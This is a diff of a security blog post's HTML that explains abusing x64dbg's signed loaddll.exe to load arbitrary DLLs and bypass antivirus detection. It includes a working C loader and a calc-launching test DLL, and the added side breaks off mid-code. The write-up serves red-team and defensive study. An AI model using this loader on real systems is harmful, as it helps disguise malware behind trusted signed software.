@@ -115,121 +115,121 @@ int __stdcall WinMain(
 <button type=button class=theme-ball role=button aria-label=切换主题 title=切换主题>
 <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4" fill="currentColor" stroke="none"/><line x1="12" y1="2" x2="12" y2="4"/><line x1="12" y1="20" x2="12" y2="22"/><line x1="4.9" y1="4.9" x2="6.3" y2="6.3"/><line x1="17.7" y1="17.7" x2="19.1" y2="19.1"/><line x1="2" y1="12" x2="4" y2="12"/><line x1="20" y1="12" x2="22" y2="12"/><line x1="4.9" y1="19.1" x2="6.3" y2="17.7"/><line x1="17.7" y1="6.3" x2="19.1" y2="4.9"/></svg>
 <svg class="icon-moon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></button></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">x64dbg中的白加黑利用</h1><div class="text-xs antialiased opacity-60"><time>Aug 17, 2022</time><span class=mx-1>&#183;</span>
-<span>倾旋</span></div></header><section><h2 id=0x00-何谓白加黑>0x00 何谓白加黑？</h2><p>在木马样本与杀毒软件的对抗中，再隐蔽的木马在被发现的那一刻，它的这一生就结束了。杀毒软件厂商通过SHA1/2、MD5等算法取得样本的唯一值来构建云端的特征库，当下一次攻击发生时，将会通过特征库进行比对，因此成本对抗不言而喻，红队的木马需要重新修改、编译，大大增加了对抗的时间、精力，这就是威胁情报的一种价值。反观有些软件确实会需要开发一些敏感行为的功能，如修改注册表、屏幕录像截图但这些是用户知情且授权的行为，这时杀毒软件再进行拦截的话，将大大降低软件使用的体验，所以出现了软件签名技术可以解决这类问题，当然软件签名技术不仅仅是为了只解决这一个问题而出现的。有些APT组织会通过控制软件开发商的代码仓库进行投毒或者通过入侵软件开发商来窃取签名，给自己的木马加上签名验证，杀毒软件遇到签名将会默认信任这个程序。但攻击软件开发商所需要投入的成本也相对比较高，telegram上也出现了花钱签名的服务，不过白嫖怪的数量可比金主爸爸要多，白嫖怪为了得到一个可以以签名程序运行自己任意代码的条件就会去挖掘一些软件厂商的程序是否存在DLL劫持漏洞，利用DLL劫持的特性达到披着羊皮的狼的目的。现阶段基本上大多数的APT组织在进行权限维持都会采用白加黑的技术来绕过杀毒软件的拦截和检测（特殊行为除外）。本文将会分享一个关于x64dbg这款调试工具的白加黑利用技巧。</p><h2 id=0x02-x64dbg的dll加载组件>0x02 x64dbg的DLL加载组件</h2><p><a href=https://github.com/x64dbg/x64dbg>x64dbg</a> 是一个开源的Windows平台下的调试工具，相比于OllyDbg我更喜欢x64dbg。打开x64dbg的目录，可以看到有一个loaddll.exe程序，顾名思义，它一定具有dll加载的功能。</p><p><a href=https://images.payloads.online/2022-08-17-15-50-00.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-50-00.png alt></a></p><p>在跟进到它的<a href=https://github.com/x64dbg/x64dbg/blob/development/src/loaddll/loaddll.cpp>源代码</a>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>wchar_t</span> szLibraryPath[<span style=color:#ae81ff>512</span>];
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>wchar_t</span> szName[<span style=color:#ae81ff>256</span>];
-</span></span><span style=display:flex><span>    wsprintfW(szName, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;Local</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>szLibraryName%X&#34;</span>, (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)GetCurrentProcessId());
-</span></span><span style=display:flex><span>    HANDLE hMapFile <span style=color:#f92672>=</span> OpenFileMappingW(FILE_MAP_READ, false, szName);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(hMapFile)
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>wchar_t</span><span style=color:#f92672>*</span> szLibraryPathMapping <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>wchar_t</span><span style=color:#f92672>*</span>)MapViewOfFile(hMapFile, FILE_MAP_READ, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(szLibraryPath));
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(szLibraryPathMapping)
-</span></span><span style=display:flex><span>        {
-</span></span><span style=display:flex><span>            lstrcpyW(szLibraryPath, szLibraryPathMapping);
-</span></span><span style=display:flex><span>            UnmapViewOfFile(szLibraryPathMapping);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        CloseHandle(hMapFile);
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(szLibraryPath[<span style=color:#ae81ff>0</span>])
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (LoadLibraryW(szLibraryPath) <span style=color:#f92672>!=</span> NULL);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>代码非常简单，大致功能是读取本地系统上一个文件映射具柄，从文件映射句柄中获取要加载的dll文件路径。文件句柄的名称包含了当前进程的PID，是不固定的。那么如何实现任意文件加载呢？</p><p>这个问题也比较简单，我的大致思路：</p><ol><li>调用CreatProcess创建一个暂停的主线程的loaddll.exe</li><li>获得loaddll.exe这个进程的启动信息，读取到它的进程ID</li><li>创建文件映射，把要加载的dll路径写入文件映射中，等待loaddll.exe读取</li><li>将loaddll.exe进程的线程从挂起状态恢复成运行状态</li></ol><p>Invoke-Loader测试代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sddl.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>WCHAR dllPath[<span style=color:#ae81ff>1024</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Temp</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Test</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>DllMain.dll&#34;</span>;
-</span></span><span style=display:flex><span>WCHAR loaderPath[] <span style=color:#f92672>=</span> <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Temp</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Test</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>loaddll.exe&#34;</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>HANDLE <span style=color:#a6e22e>CreateMapFile</span>() {
-</span></span><span style=display:flex><span>	HANDLE hFile <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>	hFile <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFile</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Temp</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Test</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>2.log&#34;</span>, FILE_GENERIC_READ <span style=color:#f92672>|</span> FILE_GENERIC_WRITE, FILE_SHARE_READ,
-</span></span><span style=display:flex><span>		NULL,
-</span></span><span style=display:flex><span>		OPEN_ALWAYS,
-</span></span><span style=display:flex><span>		NULL,
-</span></span><span style=display:flex><span>		NULL);
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (hFile <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> NULL;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>WriteFile</span>(hFile, dllPath, <span style=color:#66d9ef>sizeof</span>(dllPath), NULL, NULL);
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> hFile;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__stdcall</span> <span style=color:#a6e22e>WinMain</span>(
-</span></span><span style=display:flex><span>	HINSTANCE hInstance,
-</span></span><span style=display:flex><span>	HINSTANCE hPrevInstance,
-</span></span><span style=display:flex><span>	LPSTR     lpCmdLine,
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span>       nShowCmd
-</span></span><span style=display:flex><span>){
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>wchar_t</span> szName[<span style=color:#ae81ff>256</span>];
-</span></span><span style=display:flex><span>	DWORD dwFileSize <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>	
-</span></span><span style=display:flex><span>	HANDLE hFile <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>	HANDLE hFileMap <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>	SECURITY_ATTRIBUTES attributes;
-</span></span><span style=display:flex><span>	STARTUPINFO si;
-</span></span><span style=display:flex><span>	PROCESS_INFORMATION pi;
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ZeroMemory</span>(<span style=color:#f92672>&amp;</span>si, <span style=color:#66d9ef>sizeof</span>(si));
-</span></span><span style=display:flex><span>	si.cb <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(si);
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ZeroMemory</span>(<span style=color:#f92672>&amp;</span>pi, <span style=color:#66d9ef>sizeof</span>(pi));
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ZeroMemory</span>(<span style=color:#f92672>&amp;</span>attributes, <span style=color:#66d9ef>sizeof</span>(attributes));
-</span></span><span style=display:flex><span>	attributes.nLength <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(attributes);
-</span></span><span style=display:flex><span>	
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ConvertStringSecurityDescriptorToSecurityDescriptorA</span>(
-</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;D:P(A;OICI;GA;;;SY)(A;OICI;GA;;;BA)(A;OICI;GWGR;;;IU)&#34;</span>,
-</span></span><span style=display:flex><span>		SDDL_REVISION_1,
-</span></span><span style=display:flex><span>		<span style=color:#f92672>&amp;</span>attributes.lpSecurityDescriptor,
-</span></span><span style=display:flex><span>		NULL);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	hFile <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateMapFile</span>();
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (hFile <span style=color:#f92672>==</span> NULL) {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>	
-</span></span><span style=display:flex><span>	
-</span></span><span style=display:flex><span>	BOOL bStatus <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateProcessW</span>(loaderPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED<span style=color:#f92672>|</span> CREATE_NO_WINDOW, NULL, NULL, <span style=color:#f92672>&amp;</span>si, <span style=color:#f92672>&amp;</span>pi);
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (bStatus <span style=color:#f92672>==</span> NULL) {
-</span></span><span style=display:flex><span>		<span style=color:#75715e>/*wprintf(L&#34;[-] CreateProcess Error %d \n&#34;, GetLastError());*/</span>
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>	
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ZeroMemory</span>(szName, <span style=color:#66d9ef>sizeof</span>(szName));
-</span></span><span style=display:flex><span>	
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>wsprintfW</span>(szName, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;Local</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>szLibraryName%X&#34;</span>, (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)pi.dwProcessId);
-</span></span><span style=display:flex><span>	
-</span></span><span style=display:flex><span>	
-</span></span><span style=display:flex><span>	hFileMap <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFileMappingW</span>(hFile, <span style=color:#f92672>&amp;</span>attributes, PAGE_READWRITE, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1024</span>, szName);
-</span></span><span style=display:flex><span>    
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ResumeThread</span>(pi.hThread);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>Sleep</span>(<span style=color:#ae81ff>3000</span>);
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>编写一个dll文件用于测试：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// dllmain.cpp : 定义 DLL 应用程序的入口点。
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;pch.h&#34;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>BOOL APIENTRY <span style=color:#a6e22e>DllMain</span>( HMODULE hModule,
-</span></span><span style=display:flex><span>                       DWORD  ul_reason_for_call,
-</span></span><span style=display:flex><span>                       LPVOID lpReserved
-</span></span><span style=display:flex><span>                     )
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (ul_reason_for_call)
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
-</span></span><span style=display:flex><span>        <span style=color:#75715e>// 弹出一个计算器
-</span></span></span><span style=display:flex><span>        WinExec(<span style=color:#e6db74>&#34;calc.exe&#34;</span>, TRUE);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TRUE;
-</span></span><span style=display:flex><span>}
+<span>倾旋</span></div></header><section><h2 id=0x00-何谓白加黑>0x00 何谓白加黑？</h2><p>在木马样本与杀毒软件的对抗中，再隐蔽的木马在被发现的那一刻，它的这一生就结束了。杀毒软件厂商通过SHA1/2、MD5等算法取得样本的唯一值来构建云端的特征库，当下一次攻击发生时，将会通过特征库进行比对，因此成本对抗不言而喻，红队的木马需要重新修改、编译，大大增加了对抗的时间、精力，这就是威胁情报的一种价值。反观有些软件确实会需要开发一些敏感行为的功能，如修改注册表、屏幕录像截图但这些是用户知情且授权的行为，这时杀毒软件再进行拦截的话，将大大降低软件使用的体验，所以出现了软件签名技术可以解决这类问题，当然软件签名技术不仅仅是为了只解决这一个问题而出现的。有些APT组织会通过控制软件开发商的代码仓库进行投毒或者通过入侵软件开发商来窃取签名，给自己的木马加上签名验证，杀毒软件遇到签名将会默认信任这个程序。但攻击软件开发商所需要投入的成本也相对比较高，telegram上也出现了花钱签名的服务，不过白嫖怪的数量可比金主爸爸要多，白嫖怪为了得到一个可以以签名程序运行自己任意代码的条件就会去挖掘一些软件厂商的程序是否存在DLL劫持漏洞，利用DLL劫持的特性达到披着羊皮的狼的目的。现阶段基本上大多数的APT组织在进行权限维持都会采用白加黑的技术来绕过杀毒软件的拦截和检测（特殊行为除外）。本文将会分享一个关于x64dbg这款调试工具的白加黑利用技巧。</p><h2 id=0x02-x64dbg的dll加载组件>0x02 x64dbg的DLL加载组件</h2><p><a href=https://github.com/x64dbg/x64dbg>x64dbg</a> 是一个开源的Windows平台下的调试工具，相比于OllyDbg我更喜欢x64dbg。打开x64dbg的目录，可以看到有一个loaddll.exe程序，顾名思义，它一定具有dll加载的功能。</p><p><a href=https://images.payloads.online/2022-08-17-15-50-00.png data-fancybox=gallery data-caption><img src=https://images.payloads.online/2022-08-17-15-50-00.png alt></a></p><p>在跟进到它的<a href=https://github.com/x64dbg/x64dbg/blob/development/src/loaddll/loaddll.cpp>源代码</a>：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>wchar_t</span> <span class=n>szLibraryPath</span><span class=p>[</span><span class=mi>512</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>wchar_t</span> <span class=n>szName</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=n>wsprintfW</span><span class=p>(</span><span class=n>szName</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;Local</span><span class=se>\\</span><span class=s>szLibraryName%X&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>GetCurrentProcessId</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>hMapFile</span> <span class=o>=</span> <span class=n>OpenFileMappingW</span><span class=p>(</span><span class=n>FILE_MAP_READ</span><span class=p>,</span> <span class=nb>false</span><span class=p>,</span> <span class=n>szName</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>hMapFile</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>const</span> <span class=kt>wchar_t</span><span class=o>*</span> <span class=n>szLibraryPathMapping</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>wchar_t</span><span class=o>*</span><span class=p>)</span><span class=n>MapViewOfFile</span><span class=p>(</span><span class=n>hMapFile</span><span class=p>,</span> <span class=n>FILE_MAP_READ</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>szLibraryPath</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>szLibraryPathMapping</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>lstrcpyW</span><span class=p>(</span><span class=n>szLibraryPath</span><span class=p>,</span> <span class=n>szLibraryPathMapping</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=n>UnmapViewOfFile</span><span class=p>(</span><span class=n>szLibraryPathMapping</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=n>CloseHandle</span><span class=p>(</span><span class=n>hMapFile</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>szLibraryPath</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>LoadLibraryW</span><span class=p>(</span><span class=n>szLibraryPath</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>代码非常简单，大致功能是读取本地系统上一个文件映射具柄，从文件映射句柄中获取要加载的dll文件路径。文件句柄的名称包含了当前进程的PID，是不固定的。那么如何实现任意文件加载呢？</p><p>这个问题也比较简单，我的大致思路：</p><ol><li>调用CreatProcess创建一个暂停的主线程的loaddll.exe</li><li>获得loaddll.exe这个进程的启动信息，读取到它的进程ID</li><li>创建文件映射，把要加载的dll路径写入文件映射中，等待loaddll.exe读取</li><li>将loaddll.exe进程的线程从挂起状态恢复成运行状态</li></ol><p>Invoke-Loader测试代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;Windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sddl.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>WCHAR</span> <span class=n>dllPath</span><span class=p>[</span><span class=mi>1024</span><span class=p>]</span> <span class=o>=</span> <span class=sa>L</span><span class=s>&#34;C:</span><span class=se>\\</span><span class=s>Windows</span><span class=se>\\</span><span class=s>Temp</span><span class=se>\\</span><span class=s>Test</span><span class=se>\\</span><span class=s>DllMain.dll&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=n>WCHAR</span> <span class=n>loaderPath</span><span class=p>[]</span> <span class=o>=</span> <span class=sa>L</span><span class=s>&#34;C:</span><span class=se>\\</span><span class=s>Windows</span><span class=se>\\</span><span class=s>Temp</span><span class=se>\\</span><span class=s>Test</span><span class=se>\\</span><span class=s>loaddll.exe&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>HANDLE</span> <span class=nf>CreateMapFile</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hFile</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>hFile</span> <span class=o>=</span> <span class=nf>CreateFile</span><span class=p>(</span><span class=sa>L</span><span class=s>&#34;C:</span><span class=se>\\</span><span class=s>Windows</span><span class=se>\\</span><span class=s>Temp</span><span class=se>\\</span><span class=s>Test</span><span class=se>\\</span><span class=s>2.log&#34;</span><span class=p>,</span> <span class=n>FILE_GENERIC_READ</span> <span class=o>|</span> <span class=n>FILE_GENERIC_WRITE</span><span class=p>,</span> <span class=n>FILE_SHARE_READ</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=nb>NULL</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>OPEN_ALWAYS</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=nb>NULL</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hFile</span> <span class=o>==</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=nf>WriteFile</span><span class=p>(</span><span class=n>hFile</span><span class=p>,</span> <span class=n>dllPath</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>dllPath</span><span class=p>),</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>hFile</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__stdcall</span> <span class=nf>WinMain</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>	<span class=n>HINSTANCE</span> <span class=n>hInstance</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>HINSTANCE</span> <span class=n>hPrevInstance</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>LPSTR</span>     <span class=n>lpCmdLine</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span>       <span class=n>nShowCmd</span>
+</span></span><span class=line><span class=cl><span class=p>){</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>szName</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>dwFileSize</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hFile</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hFileMap</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>SECURITY_ATTRIBUTES</span> <span class=n>attributes</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>STARTUPINFO</span> <span class=n>si</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>PROCESS_INFORMATION</span> <span class=n>pi</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=nf>ZeroMemory</span><span class=p>(</span><span class=o>&amp;</span><span class=n>si</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>si</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>	<span class=n>si</span><span class=p>.</span><span class=n>cb</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>si</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=nf>ZeroMemory</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pi</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>pi</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>	<span class=nf>ZeroMemory</span><span class=p>(</span><span class=o>&amp;</span><span class=n>attributes</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>attributes</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>	<span class=n>attributes</span><span class=p>.</span><span class=n>nLength</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>attributes</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=nf>ConvertStringSecurityDescriptorToSecurityDescriptorA</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>		<span class=s>&#34;D:P(A;OICI;GA;;;SY)(A;OICI;GA;;;BA)(A;OICI;GWGR;;;IU)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>SDDL_REVISION_1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=o>&amp;</span><span class=n>attributes</span><span class=p>.</span><span class=n>lpSecurityDescriptor</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>hFile</span> <span class=o>=</span> <span class=nf>CreateMapFile</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hFile</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
